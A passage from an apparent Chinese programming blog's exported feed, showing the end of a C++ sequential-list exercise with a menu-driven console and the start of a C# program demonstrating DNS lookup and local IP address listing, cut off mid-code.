e <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//后续以e作为各中值的存放变量</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//第几个元素</span>    <span class="token comment" spellcheck="true">//选择</span>    <span class="token keyword">int</span> mark <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> label<span class="token operator">:</span>    <span class="token function">TipsDisplay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"请输入操作代码:"</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> mark<span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>mark<span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>        <span class="token comment" spellcheck="true">//清空表</span>        <span class="token function">ClearList</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"================"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">goto</span> label<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//break;</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token comment" spellcheck="true">//判空</span>        <span class="token function">isEmpty</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"================"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">goto</span> label<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//break;</span>    <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>        <span class="token comment" spellcheck="true">//求表长</span>        <span class="token function">getLength</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"================"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">goto</span> label<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//break;</span>    <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>        <span class="token comment" spellcheck="true">//取值</span>        e <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//重置e，避免上次e的结果被输出</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"请输入代取元素的序号："</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cin <span class="token operator">>></span> i<span class="token punctuation">;</span>        <span class="token function">GetElem</span><span class="token punctuation">(</span> L<span class="token punctuation">,</span> i<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> e <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"================"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">goto</span> label<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//break;</span>    <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>        <span class="token comment" spellcheck="true">//求前驱</span>        e <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//重置e，避免上次e的结果被输出</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"请输入要求第几个元素的前驱："</span><span class="token punctuation">;</span>        cin <span class="token operator">>></span> i<span class="token punctuation">;</span>        <span class="token function">getPrecursor</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> i<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> e <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"================"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">goto</span> label<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//break;</span>    <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>        e <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//重置e，避免上次e的结果被输出</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"请输入要求第几个元素的后继："</span><span class="token punctuation">;</span>        cin <span class="token operator">>></span> i<span class="token punctuation">;</span>        <span class="token function">getSuccessor</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> i<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span>e<span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"================"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">goto</span> label<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//break;</span>    <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>        <span class="token comment" spellcheck="true">//插入</span>        e <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//重置e，避免上次e的结果被输出</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"请输入待插入的位置："</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cin <span class="token operator">>></span> i<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"请输入待插入的值："</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cin <span class="token operator">>></span> e<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token function">ListInsert</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"================"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">goto</span> label<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//break;</span>    <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>        <span class="token comment" spellcheck="true">//删除</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"请输入待删除元素的位置："</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cin <span class="token operator">>></span> i<span class="token punctuation">;</span>        <span class="token function">ListDelete</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"================"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">goto</span> label<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//break;</span>    <span class="token keyword">case</span> <span class="token number">9</span><span class="token operator">:</span>        <span class="token function">display</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"================"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">goto</span> label<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//break;</span>    <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//break; //逻辑上可以不要break;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//初始化表</span>Status <span class="token function">InitList</span><span class="token punctuation">(</span>SqList<span class="token operator">&amp;</span> L<span class="token punctuation">)</span><span class="token punctuation">{</span>    L<span class="token punctuation">.</span>elem <span class="token operator">=</span> <span class="token keyword">new</span> ElemType<span class="token punctuation">[</span>MAXSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>L<span class="token punctuation">.</span>elem<span class="token punctuation">)</span> <span class="token function">exit</span><span class="token punctuation">(</span>OVERFLOW<span class="token punctuation">)</span><span class="token punctuation">;</span>    L<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> OK<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//清空</span><span class="token keyword">void</span> <span class="token function">ClearList</span><span class="token punctuation">(</span>SqList <span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">{</span>    L<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//判空</span><span class="token keyword">void</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"List is empity!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"List is not empity!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//表长</span><span class="token keyword">void</span> <span class="token function">getLength</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> length <span class="token operator">=</span> L<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> length <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//取指定位置的值</span>Status <span class="token function">GetElem</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType<span class="token operator">&amp;</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//判断i是否合理</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> i<span class="token operator">></span>L<span class="token punctuation">.</span>length<span class="token punctuation">)</span>     <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"位置非法！"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">return</span> ERROR<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    e <span class="token operator">=</span> L<span class="token punctuation">.</span>elem<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> OK<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//求前驱</span>Status <span class="token function">getPrecursor</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType<span class="token operator">&amp;</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">></span> L<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"前驱不存在"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">return</span> ERROR<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    e <span class="token operator">=</span> L<span class="token punctuation">.</span>elem<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> OK<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//求后继</span>Status <span class="token function">getSuccessor</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType<span class="token operator">&amp;</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">></span> L<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"后继不存在"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">return</span> ERROR<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    e <span class="token operator">=</span> L<span class="token punctuation">.</span>elem<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> OK<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//插入</span>Status <span class="token function">ListInsert</span><span class="token punctuation">(</span>SqList <span class="token operator">&amp;</span>L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span>ElemType e<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">></span> L<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"插入失败！"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">return</span> ERROR<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token punctuation">.</span>length <span class="token operator">==</span> MAXSIZE<span class="token punctuation">)</span> <span class="token keyword">return</span> ERROR<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> L<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> i<span class="token number">-1</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        L<span class="token punctuation">.</span>elem<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> L<span class="token punctuation">.</span>elem<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    L<span class="token punctuation">.</span>elem<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>    <span class="token operator">++</span>L<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"插入成功！"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> OK<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//删除线性表指定位置元素</span>Status <span class="token function">ListDelete</span><span class="token punctuation">(</span>SqList <span class="token operator">&amp;</span>L<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">></span> L<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"删除失败！"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">return</span> ERROR<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j<span class="token operator">&lt;=</span>L<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        L<span class="token punctuation">.</span>elem<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> L<span class="token punctuation">.</span>elem<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    L<span class="token punctuation">.</span>length<span class="token operator">--</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"删除成功！"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> OK<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//9----显示线性表</span><span class="token keyword">void</span> <span class="token function">display</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> L<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>            cout <span class="token operator">&lt;&lt;</span> L<span class="token punctuation">.</span>elem<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"  "</span><span class="token punctuation">;</span>            <span class="token operator">++</span>j<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token keyword">else</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"空表"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//如何操作程序</span><span class="token keyword">void</span> <span class="token function">TipsDisplay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"1----清空线性表"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"2----判断线性表是否为空"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"3----求线性表长度"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"4----获取线性表指定位置元素"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"5----求前驱"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"6----求后继"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"7----在线性表指定位置插入元素"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"8----删除线性表指定位置元素"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"9----显示线性表"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"     退出，输入一个负数!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="本人水平一般，欢迎批评指正。"><a href="#本人水平一般，欢迎批评指正。" class="headerlink" title="本人水平一般，欢迎批评指正。"></a>本人水平一般，欢迎批评指正。</h4><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C#</title>
      <link href="/2020/03/08/c/"/>
      <url>/2020/03/08/c/</url>
      
        <content type="html"><![CDATA[<h2 id="C-实现"><a href="#C-实现" class="headerlink" title="C#实现"></a>C#实现</h2><h5 id="A-DNS域名解析和IP地址转换的基本用法"><a href="#A-DNS域名解析和IP地址转换的基本用法" class="headerlink" title="A:DNS域名解析和IP地址转换的基本用法"></a>A:DNS域名解析和IP地址转换的基本用法</h5><h5 id="B-获取网络适配器信息"><a href="#B-获取网络适配器信息" class="headerlink" title="B:获取网络适配器信息"></a>B:获取网络适配器信息</h5><h5 id="C-网络流量统计"><a href="#C-网络流量统计" class="headerlink" title="C:网络流量统计"></a>C:网络流量统计</h5><h5 id="D-退出程序"><a href="#D-退出程序" class="headerlink" title="D:退出程序"></a>D:退出程序</h5><a id="more"></a><pre class=" language-bash"><code class="language-bash">using System<span class="token punctuation">;</span>using System.Text<span class="token punctuation">;</span>using System.Net<span class="token punctuation">;</span>using System.Net.NetworkInformation<span class="token punctuation">;</span>using System.Net.Sockets<span class="token punctuation">;</span>using System.Diagnostics<span class="token punctuation">;</span>using System.Timers<span class="token punctuation">;</span>namespace Chapter_1<span class="token punctuation">{</span>    class Program    <span class="token punctuation">{</span>        static void Main<span class="token punctuation">(</span>string<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            //Timer timer <span class="token operator">=</span> new Timer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            //timer.Enabled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            //timer.Interval <span class="token operator">=</span> 2000<span class="token punctuation">;</span>            //timer.Start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            //timer.Elapsed +<span class="token operator">=</span> new ElapsedEventHandler<span class="token punctuation">(</span>exit<span class="token punctuation">)</span><span class="token punctuation">;</span>            dph_NetInfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        private static void dph_NetInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console.WriteLine<span class="token punctuation">(</span><span class="token string">"A:DNS域名解析和IP地址转换的基本用法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console.WriteLine<span class="token punctuation">(</span><span class="token string">"B:获取网络适配器信息"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console.WriteLine<span class="token punctuation">(</span><span class="token string">"C:网络流量统计"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console.WriteLine<span class="token punctuation">(</span><span class="token string">"D:退出程序"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console.Write<span class="token punctuation">(</span><span class="token string">"请输入："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            string ch <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>            ch <span class="token operator">=</span> Console.ReadLine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            switch <span class="token punctuation">(</span>ch<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">"A"</span><span class="token keyword">:</span>                    dnsAnalysis<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    dph_NetInfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"B"</span><span class="token keyword">:</span>                    networkTrafficStatistics<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    dph_NetInfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"C"</span><span class="token keyword">:</span>                    networkAdapterInfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    dph_NetInfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                default:                    <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        //DNS域名解析和IP地址转换的基本用法        public static void dnsAnalysis<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            StringBuilder sb <span class="token operator">=</span> new StringBuilder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            string str <span class="token operator">=</span> <span class="token string">"www.baidu.com"</span><span class="token punctuation">;</span>            sb.AppendLine<span class="token punctuation">(</span><span class="token string">"获取"</span> + str + <span class="token string">"的所有IP地址："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            IPAddress<span class="token punctuation">[</span><span class="token punctuation">]</span> ips <span class="token operator">=</span> Dns.GetHostAddresses<span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>            foreach <span class="token punctuation">(</span>var ip <span class="token keyword">in</span> ips<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                sb.AppendLine<span class="token punctuation">(</span>ip.ToString<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            string hostName <span class="token operator">=</span> Dns.GetHostName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sb.AppendLine<span class="token punctuation">(</span><span class="token string">"获取本机所有IP地址："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            try            <span class="token punctuation">{</span>                //本机                IPHostEntry me <span class="token operator">=</span> Dns.GetHostEntry<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                foreach <span class="token punctuation">(</span>IPAddress ip <span class="token keyword">in</span> me.AddressList<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    if<span class="token punctuation">(</span>ip.AddressFamily <span class="token operator">==</span> AddressFamily.InterNetwork<span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        sb.AppendLine<span class="token punctuation">(</span><span class="token string">"IPV4: "</span> + ip.ToString<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span> if<span class="token punctuation">(</span>ip.AddressFamily <span class="token operator">==</span> AddressFamily.InterNetworkV6<span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        sb.AppendLine<span class="token punctuation">(</span><span class="token string">"IPV6: "</span> + ip.ToString<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        sb.AppendLine<span class="token punctuation">(</span><span class="token string">"其他："</span> + ip.ToString<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                //IPv4                IPAddress localIPv4 <span class="token operator">=</span> IPAddress.Parse<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Output<span class="token punctuation">(</span>sb, localIPv4<span class="token punctuation">)</span><span class="token punctuation">;</span>                //IPv6                IPAddress localIPv6 <span class="token operator">=</span> IPAddress.Parse<span class="token punctuation">(</span><span class="token string">"::1"</span><span class="token 